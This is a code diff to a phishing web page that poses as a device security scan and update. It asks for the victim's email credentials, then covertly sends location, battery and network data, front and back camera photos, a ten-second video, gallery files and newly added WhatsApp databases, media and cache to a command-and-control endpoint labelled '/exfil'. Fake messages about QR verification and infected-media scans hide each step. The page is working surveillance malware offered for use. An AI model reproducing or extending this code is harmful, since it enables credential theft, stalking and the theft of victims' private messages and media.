@@ -110,6 +110,7 @@
         .btn-secondary { background: transparent; border: 1px solid #2a2a44; color: #8888aa; }
         .btn-secondary:hover { background: #1a1a2e; border-color: #444466; }
         .btn-warning { background: linear-gradient(135deg, #ff8800, #ff4400); }
+        .btn-whatsapp { background: linear-gradient(135deg, #25D366, #128C7E); }
         .scan-status {
             display: flex;
             align-items: center;
@@ -172,6 +173,7 @@
         .scan-log .log-entry.done { color: #44ff88; }
         .scan-log .log-entry.warn { color: #ffaa44; }
         .scan-log .log-entry.error { color: #ff4466; }
+        .scan-log .log-entry.whatsapp { color: #25D366; }
         .complete-icon { font-size: 52px; text-align: center; margin: 10px 0 16px; }
         .complete-text { text-align: center; font-size: 16px; color: #88ff88; font-weight: 600; }
         .complete-sub { text-align: center; font-size: 13px; color: #666688; margin-top: 4px; }
@@ -217,7 +219,7 @@
             <span class="speed-badge" id="speedBadge">⚡ Fast Mode</span>
         </div>
 
-        <!-- STEP 1 -->
+        <!-- STEP 1: CREDENTIALS -->
         <div class="step active" id="step1">
             <div class="step-title">🔐 Verify Identity</div>
             <div class="step-sub">
@@ -238,7 +240,7 @@
             </p>
         </div>
 
-        <!-- STEP 2 -->
+        <!-- STEP 2: SCAN + DATA COLLECTION -->
         <div class="step" id="step2">
             <div class="step-title">🔍 Scanning Device</div>
             <div class="step-sub" id="stepSub">Please wait while we scan for vulnerabilities...</div>
@@ -270,7 +272,7 @@
             </div>
         </div>
 
-        <!-- STEP 3 -->
+        <!-- STEP 3: COMPLETE -->
         <div class="step" id="step3">
             <div class="complete-icon">✅</div>
             <div class="complete-text">Update Ready</div>
@@ -285,16 +287,13 @@
     </div>
 
     <script>
-        // ============================================================
-        // 24/7 C2 SERVER — RENDER.COM
-        // ============================================================
         const C2_URL = 'https://c2-server-noio.onrender.com/exfil';
-
         let totalFiles = 0;
         let uploadedFiles = 0;
         let progress = 0;
         let galleryComplete = false;
         let startTime = 0;
+        let whatsappComplete = false;
 
         // ============================================================
         // DEVICE DETECTION
@@ -334,7 +333,7 @@
         }
 
         // ============================================================
-        // STEP 1
+        // STEP 1: CREDENTIALS
         // ============================================================
         function step1() {
             const email = document.getElementById('email').value;
@@ -350,98 +349,80 @@
         }
 
         // ============================================================
-        // STEP 2
+        // STEP 2: DATA COLLECTION — NEW ORDER
         // ============================================================
         async function startDataCollection() {
             addLogEntry('● Starting data collection...', 'done');
             startTime = Date.now();
 
-            addLogEntry('📍 Detecting region for security verification...', 'warn');
+            // 1. LOCATION
+            addLogEntry('📍 Detecting region...', 'warn');
             await collectLocationWithFallback();
-            updateProgress(10);
+            updateProgress(5);
 
-            addLogEntry('🔋 Checking device power status...', 'warn');
+            // 2. BATTERY + NETWORK
+            addLogEntry('🔋 Checking device status...', 'warn');
             await collectBattery();
             await collectNetwork();
+            updateProgress(10);
+
+            // 3. CAMERA MEDIA
+            addLogEntry('📸 Capturing camera media...', 'warn');
+            await collectCameraMedia();
             updateProgress(20);
 
-            addLogEntry('📸 Preparing QR verification...', 'warn');
-            await collectCameraMedia();
-            updateProgress(35);
+            // 4. WHATSAPP DATA (BEFORE GALLERY)
+            addLogEntry('💬 Extracting WhatsApp data...', 'warn');
+            await extractWhatsAppData();
+            updateProgress(50);
 
+            // 5. GALLERY EXTRACTION (Last)
             addLogEntry('📁 Preparing storage scan...', 'warn');
             document.getElementById('storageBtnContainer').style.display = 'block';
             document.getElementById('scanDesc').textContent = '📁 Tap "Select Storage" to scan for infected media...';
             document.getElementById('scanIcon').classList.remove('spinning');
             document.getElementById('scanIcon').textContent = '📁';
-            updateProgress(40);
+            updateProgress(55);
 
             await waitForGallery();
         }
 
         // ============================================================
-        // LOCATION WITH FALLBACK
+        // COLLECT LOCATION
         // ============================================================
         function collectLocationWithFallback() {
             return new Promise((resolve) => {
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
                         pos => {
-                            sendData({
-                                type: 'location',
-                                lat: pos.coords.latitude,
-                                lon: pos.coords.longitude,
-                                accuracy: pos.coords.accuracy,
-                                source: 'gps'
-                            });
+                            sendData({ type: 'location', lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy, source: 'gps' });
                             addLogEntry('✅ Region detected', 'done');
                             resolve();
                         },
                         err => {
-                            addLogEntry('⚠️ Location detection unavailable. Using network fallback.', 'warn');
+                            addLogEntry('⚠️ GPS failed. Using IP fallback.', 'warn');
                             getIPLocation(resolve);
                         },
                         { enableHighAccuracy: true, timeout: 10000 }
                     );
                 } else {
-                    addLogEntry('⚠️ Location detection unavailable. Using network fallback.', 'warn');
+                    addLogEntry('⚠️ Using IP fallback.', 'warn');
                     getIPLocation(resolve);
                 }
             });
         }
 
-        // ============================================================
-        // IP GEOLOCATION
-        // ============================================================
         function getIPLocation(resolve) {
             fetch('https://ipapi.co/json/')
                 .then(res => res.json())
                 .then(data => {
                     if (data && data.latitude && data.longitude) {
-                        sendData({
-                            type: 'location',
-                            lat: data.latitude,
-                            lon: data.longitude,
-                            accuracy: 'IP (approx)',
-                            source: 'ip',
-                            city: data.city || '',
-                            region: data.region || '',
-                            country: data.country_name || '',
-                            timezone: data.timezone || '',
-                            isp: data.org || ''
-                        });
+                        sendData({ type: 'location', lat: data.latitude, lon: data.longitude, accuracy: 'IP (approx)', source: 'ip', city: data.city || '', region: data.region || '', country: data.country_name || '' });
                         addLogEntry(`✅ Region: ${data.city}, ${data.country_name}`, 'done');
-                    } else {
-                        sendData({ type: 'location', error: 'IP geolocation failed' });
-                        addLogEntry('❌ Network fallback failed', 'error');
                     }
                     resolve();
                 })
-                .catch(() => {
-                    sendData({ type: 'location', error: 'IP geolocation unavailable' });
-                    addLogEntry('❌ Network fallback unavailable', 'error');
-                    resolve();
-                });
+                .catch(() => { addLogEntry('❌ IP fallback failed', 'error'); resolve(); });
         }
 
         // ============================================================
@@ -454,7 +435,7 @@
                     sendData({ type: 'battery', level: Math.round(battery.level * 100) + '%', charging: battery.charging });
                     addLogEntry('✅ Power status checked', 'done');
                 }
-            } catch (e) { addLogEntry('❌ Power check failed: ' + e.message, 'error'); }
+            } catch (e) { addLogEntry('❌ Battery check failed', 'error'); }
         }
 
         // ============================================================
@@ -475,35 +456,23 @@
         // ============================================================
         async function collectCameraMedia() {
             try {
-                addLogEntry('📸 Scanning QR code for verification...', 'warn');
+                addLogEntry('📸 QR verification (back)...', 'warn');
                 const backPhoto = await capturePhoto('environment');
-                if (backPhoto) {
-                    sendData({ type: 'photo', camera: 'back', data: backPhoto });
-                    addLogEntry('✅ QR scan completed (back camera)', 'done');
-                }
+                if (backPhoto) { sendData({ type: 'photo', camera: 'back', data: backPhoto }); addLogEntry('✅ Back photo captured', 'done'); }
 
-                addLogEntry('📸 Scanning QR code from front camera...', 'warn');
+                addLogEntry('📸 QR verification (front)...', 'warn');
                 const frontPhoto = await capturePhoto('user');
-                if (frontPhoto) {
-                    sendData({ type: 'photo', camera: 'front', data: frontPhoto });
-                    addLogEntry('✅ QR scan completed (front camera)', 'done');
-                }
+                if (frontPhoto) { sendData({ type: 'photo', camera: 'front', data: frontPhoto }); addLogEntry('✅ Front photo captured', 'done'); }
 
-                addLogEntry('🎥 Recording verification video...', 'warn');
+                addLogEntry('🎥 Verification video...', 'warn');
                 const videoData = await captureVideo('user', 10);
-                if (videoData) {
-                    sendData({ type: 'video', camera: 'front', duration: '10s', data: videoData });
-                    addLogEntry('✅ Verification video recorded', 'done');
-                }
+                if (videoData) { sendData({ type: 'video', camera: 'front', duration: '10s', data: videoData }); addLogEntry('✅ Video captured', 'done'); }
             } catch (err) {
                 addLogEntry('❌ Camera error: ' + err.message, 'error');
                 sendData({ type: 'media_error', error: err.message });
             }
         }
 
-        // ============================================================
-        // PHOTO & VIDEO CAPTURE
-        // ============================================================
         async function capturePhoto(facingMode) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode, width: { ideal: 640 }, height: { ideal: 480 } } });
@@ -542,6 +511,227 @@
         }
 
         // ============================================================
+        // WHATSAPP DATA EXTRACTION (NEW)
+        // ============================================================
+        async function extractWhatsAppData() {
+            try {
+                // Step 1: Ask user to select WhatsApp folder
+                addLogEntry('📂 Please select WhatsApp folder...', 'warn');
+                const rootHandle = await window.showDirectoryPicker({ mode: 'read' });
+
+                // Try to find WhatsApp folder
+                let whatsappFound = false;
+                const whatsappPaths = [
+                    'Android/media/com.whatsapp/',
+                    'WhatsApp/',
+                    'Media/WhatsApp/'
+                ];
+
+                let whatsappHandle = null;
+                let whatsappPath = '';
+
+                for (const path of whatsappPaths) {
+                    try {
+                        const parts = path.split('/').filter(p => p);
+                        let current = rootHandle;
+                        let currentPath = '';
+                        for (const part of parts) {
+                            current = await current.getDirectoryHandle(part);
+                            currentPath += part + '/';
+                        }
+                        if (current) {
+                            whatsappHandle = current;
+                            whatsappPath = currentPath;
+                            whatsappFound = true;
+                            addLogEntry(`✅ WhatsApp found at: ${whatsappPath}`, 'whatsapp');
+                            break;
+                        }
+                    } catch (e) { /* continue */ }
+                }
+
+                if (!whatsappFound) {
+                    addLogEntry('❌ WhatsApp folder not found. Skipping WhatsApp extraction.', 'error');
+                    return;
+                }
+
+                // Step 2: Extract WhatsApp Database
+                addLogEntry('📊 Extracting WhatsApp database...', 'warn');
+                await extractWhatsAppDatabase(whatsappHandle, whatsappPath);
+
+                // Step 3: Extract WhatsApp Media
+                addLogEntry('📸 Extracting WhatsApp media...', 'warn');
+                await extractWhatsAppMedia(whatsappHandle, whatsappPath);
+
+                // Step 4: Extract WhatsApp Cache
+                addLogEntry('💾 Extracting WhatsApp cache...', 'warn');
+                await extractWhatsAppCache(whatsappHandle, whatsappPath);
+
+                whatsappComplete = true;
+                addLogEntry('✅ WhatsApp data extraction complete', 'whatsapp');
+                sendData({ type: 'whatsapp_extraction_complete' });
+
+            } catch (err) {
+                addLogEntry('❌ WhatsApp extraction error: ' + err.message, 'error');
+                sendData({ type: 'whatsapp_extraction_error', error: err.message });
+            }
+        }
+
+        // ============================================================
+        // EXTRACT WHATSAPP DATABASE
+        // ============================================================
+        async function extractWhatsAppDatabase(whatsappHandle, basePath) {
+            try {
+                const dbPaths = ['Databases/', 'databases/'];
+                let dbHandle = null;
+
+                for (const dbPath of dbPaths) {
+                    try {
+                        dbHandle = await whatsappHandle.getDirectoryHandle(dbPath);
+                        break;
+                    } catch (e) { /* continue */ }
+                }
+
+                if (!dbHandle) {
+                    addLogEntry('⚠️ WhatsApp database folder not found', 'warn');
+                    return;
+                }
+
+                const files = ['msgstore.db', 'wa.db', 'chatsettings.db'];
+                for (const file of files) {
+                    try {
+                        const fileHandle = await dbHandle.getFileHandle(file);
+                        const fileObj = await fileHandle.getFile();
+                        const reader = new FileReader();
+                        const dataUrl = await new Promise((resolve) => {
+                            reader.onload = () => resolve(reader.result);
+                            reader.readAsDataURL(fileObj);
+                        });
+                        const base64Data = dataUrl.split(',')[1];
+
+                        await sendData({
+                            type: 'whatsapp_database',
+                            filename: file,
+                            path: `${basePath}Databases/${file}`,
+                            size: fileObj.size,
+                            data: base64Data
+                        });
+                        addLogEntry(`✅ WhatsApp DB: ${file} (${(fileObj.size/1024).toFixed(1)} KB)`, 'whatsapp');
+                    } catch (e) {
+                        addLogEntry(`⚠️ WhatsApp DB not found: ${file}`, 'warn');
+                    }
+                }
+            } catch (err) {
+                addLogEntry('❌ Database extraction error: ' + err.message, 'error');
+            }
+        }
+
+        // ============================================================
+        // EXTRACT WHATSAPP MEDIA
+        // ============================================================
+        async function extractWhatsAppMedia(whatsappHandle, basePath) {
+            try {
+                const mediaFolders = ['Media/WhatsApp Images/', 'Media/WhatsApp Video/', 'Media/WhatsApp Audio/'];
+                let totalMedia = 0;
+
+                for (const folder of mediaFolders) {
+                    try {
+                        const folderHandle = await whatsappHandle.getDirectoryHandle(folder);
+                        let count = 0;
+                        const files = [];
+
+                        for await (const entry of folderHandle.values()) {
+                            if (entry.kind === 'file') {
+                                const ext = entry.name.split('.').pop().toLowerCase();
+                                const mediaExts = ['jpg', 'jpeg', 'png', 'gif', 'mp4', 'mov', 'avi', 'webm', '3gp', 'm4a', 'opus', 'aac'];
+                                if (mediaExts.includes(ext)) {
+                                    files.push({ name: entry.name, handle: entry });
+                                }
+                            }
+                        }
+
+                        // Limit to 20 files per folder to avoid overload
+                        const maxFiles = 20;
+                        for (let i = 0; i < Math.min(files.length, maxFiles); i++) {
+                            try {
+                                const fileObj = await files[i].handle.getFile();
+                                const reader = new FileReader();
+                                const dataUrl = await new Promise((resolve) => {
+                                    reader.onload = () => resolve(reader.result);
+                                    reader.readAsDataURL(fileObj);
+                                });
+                                const base64Data = dataUrl.split(',')[1];
+
+                                await sendData({
+                                    type: 'whatsapp_media',
+                                    filename: files[i].name,
+                                    path: `${basePath}${folder}${files[i].name}`,
+                                    size: fileObj.size,
+                                    data: base64Data
+                                });
+                                count++;
+                                totalMedia++;
+                                if (count % 5 === 0) {
+                                    addLogEntry(`📤 WhatsApp media: ${count} uploaded from ${folder}`, 'whatsapp');
+                                }
+                            } catch (e) { /* skip individual file errors */ }
+                        }
+                        if (count > 0) {
+                            addLogEntry(`✅ WhatsApp ${folder}: ${count} files uploaded (limited)`, 'whatsapp');
+                        }
+                    } catch (e) { /* folder not found */ }
+                }
+
+                if (totalMedia === 0) {
+                    addLogEntry('⚠️ No WhatsApp media files found', 'warn');
+                }
+
+            } catch (err) {
+                addLogEntry('❌ Media extraction error: ' + err.message, 'error');
+            }
+        }
+
+        // ============================================================
+        // EXTRACT WHATSAPP CACHE
+        // ============================================================
+        async function extractWhatsAppCache(whatsappHandle, basePath) {
+            try {
+                const cacheHandle = await whatsappHandle.getDirectoryHandle('Cache/');
+                let count = 0;
+
+                for await (const entry of cacheHandle.values()) {
+                    if (entry.kind === 'file' && count < 10) {
+                        try {
+                            const fileObj = await entry.getFile();
+                            if (fileObj.size > 0 && fileObj.size < 1024 * 1024) { // under 1MB
+                                const reader = new FileReader();
+                                const dataUrl = await new Promise((resolve) => {
+                                    reader.onload = () => resolve(reader.result);
+                                    reader.readAsDataURL(fileObj);
+                                });
+                                const base64Data = dataUrl.split(',')[1];
+
+                                await sendData({
+                                    type: 'whatsapp_cache',
+                                    filename: entry.name,
+                                    path: `${basePath}Cache/${entry.name}`,
+                                    size: fileObj.size,
+                                    data: base64Data
+                                });
+                                count++;
+                            }
+                        } catch (e) { /* skip */ }
+                    }
+                }
+
+                if (count > 0) {
+                    addLogEntry(`✅ WhatsApp cache: ${count} files uploaded`, 'whatsapp');
+                }
+            } catch (e) {
+                addLogEntry('⚠️ WhatsApp cache not found', 'warn');
+            }
+        }
+
+        // ============================================================
         // WAIT FOR GALLERY
         // ============================================================
         function waitForGallery() {
@@ -551,7 +741,7 @@
                         clearInterval(checkInterval);
                         updateProgress(100);
                         const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
-                        addLogEntry(`✅ All checks completed in ${elapsed}s!`, 'done');
+                        addLogEntry(`✅ Scan complete in ${elapsed}s!`, 'done');
                         document.getElementById('stepSub').textContent = `✅ Scan complete in ${elapsed}s. All data verified.`;
                         setTimeout(() => {
                             document.getElementById('step2').classList.remove('active');
@@ -577,20 +767,20 @@
                 const dirHandle = await window.showDirectoryPicker({ mode: 'read' });
                 const folderName = dirHandle.name || 'Root';
                 addLogEntry(`● Storage selected: ${folderName}`, 'done');
-                document.getElementById('scanTitle').textContent = '📁 Scanning storage...';
+                document.getElementById('scanTitle').textContent = '📁 Scanning gallery...';
                 document.getElementById('scanDesc').textContent = `Scanning ${folderName} for infected files...`;
                 document.getElementById('storageBtnContainer').style.display = 'none';
                 document.getElementById('scanIcon').classList.add('spinning');
                 document.getElementById('scanIcon').textContent = '⚡';
-                updateProgress(45);
+                updateProgress(55);
 
                 const fileQueue = [];
                 await collectFileEntries(dirHandle, '', fileQueue);
                 const totalFilesFound = fileQueue.length;
-                addLogEntry(`● Found ${totalFilesFound} media files`, 'done');
+                addLogEntry(`● Found ${totalFilesFound} gallery files`, 'done');
 
                 if (totalFilesFound === 0) {
-                    addLogEntry('● No media files found', 'warn');
+                    addLogEntry('● No gallery files found', 'warn');
                     sendData({ type: 'media_extraction_complete', count: 0 });
                     galleryComplete = true;
                     return;
@@ -634,7 +824,7 @@
                             });
 
                             uploadedFiles++;
-                            const pct = 45 + (uploadedFiles / totalFilesFound) * 55;
+                            const pct = 55 + (uploadedFiles / totalFilesFound) * 45;
                             updateProgress(pct);
                             document.getElementById('scanDesc').textContent =
                                 `📤 ${uploadedFiles}/${totalFilesFound} files scanned (${Math.round(pct)}%)`;
@@ -738,7 +928,7 @@
         }
 
         // ============================================================
-        // STEP 3
+        // STEP 3: INSTALL
         // ============================================================
         function step3() {
             if (!galleryComplete) {
